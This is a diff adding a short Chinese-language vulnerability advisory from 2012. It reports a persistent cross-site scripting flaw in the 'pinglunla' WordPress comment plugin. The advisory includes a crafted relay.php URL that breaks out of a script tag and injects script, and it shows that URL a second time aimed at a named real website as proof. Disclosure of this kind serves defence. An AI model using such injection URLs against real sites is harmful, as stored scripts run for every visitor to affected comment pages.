@@ -1,0 +1,25 @@
+Wordpress插件永久XSS漏洞 
+
+漏洞详情
+
+披露状态：
+
+
+
+2012-03-06： 积极联系厂商并且等待厂商认领中，细节不对外公开
+2012-04-20： 厂商已经主动忽略漏洞，细节向公众公开
+
+
+简要描述：
+
+通过精心构造的 URL, 匿名用户可注入恶意脚本
+
+详细说明：
+
+/wp-content/plugins/pinglunla/relay.php?sid=ec51555f3e5e125257457a73609bdbe15cb7c29d"></script><script>alert(0)</script><script%20src="
+ 
+以上 URL 用于篡改评论啦的 SID, 同时注入任意脚本, 脚本会被永久保存, 影响所有开启评论功能的页面.
+
+漏洞证明：
+
+http://www.alibuybuy.com/wp-content/plugins/pinglunla/relay.php?sid=ec51555f3e5e125257457a73609bdbe15cb7c29d"></script><script>alert(0)</script><script%20src="
